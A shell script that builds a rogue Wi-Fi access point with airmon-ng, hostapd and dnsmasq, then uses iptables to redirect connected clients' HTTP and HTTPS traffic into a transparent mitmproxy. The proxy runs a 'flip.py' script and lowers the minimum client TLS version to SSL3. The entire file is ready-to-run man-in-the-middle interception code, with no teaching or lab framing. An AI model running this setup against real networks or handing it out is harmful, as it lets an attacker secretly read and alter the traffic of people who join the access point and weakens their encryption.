#!/bin/sh

# check if sudo
if [ "$EUID" -ne 0 ]; then
    echo "Please run script as root."
    exit
fi

check_progs() {
    echo "[*] checking if dependencies exist."
    [ -f /usr/bin/dnsmasq ] || echo "[-] dnsmasq not found."
    [ -f /usr/bin/hostapd ] || echo "[-] hostapd not found."
    [ -f /usr/bin/mitmproxy ] || echo "[-] mitmproxy not found."
}
check_progs


#airmon-ng check kill

airmon-ng start wlan1

ifconfig wlan1mon up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1

firewall_set() {
	# $1: append or delete

	iptables --table nat --$1 POSTROUTING --out-interface wlan0 -j MASQUERADE
	iptables --$1 FORWARD --in-interface wlan1mon -j ACCEPT
	iptables --table nat --$1 PREROUTING -i wlan1mon -p tcp --dport 80 -j REDIRECT --to-port 8080
	iptables --table nat --$1 PREROUTING -i wlan1mon -p tcp --dport 443 -j REDIRECT --to-port 8080
	[ "$1" = "delete" ] && b=0 || b=1

	echo $b > /proc/sys/net/ipv4/ip_forward
};

firewall_set append

# will run programs in background.
# if debugging is desired, run the following alternatives:
# dnsmasq -C dnsmasq.conf -d
# hostapd hostapd.conf
dnsmasq -C dnsmasq.conf
hostapd -B hostapd.conf

# run mitm with either:
# mitmproxy or mitmweb
mitmproxy --set tls_version_client_min=SSL3 --mode transparent --showhost -s flip.py

# cleanup
pkill mitmproxy || pkill mitmweb
pkill dnsmasq
pkill hostapd
firewall_set delete

airmon-ng stop wlan1

systemctl restart NetworkManager
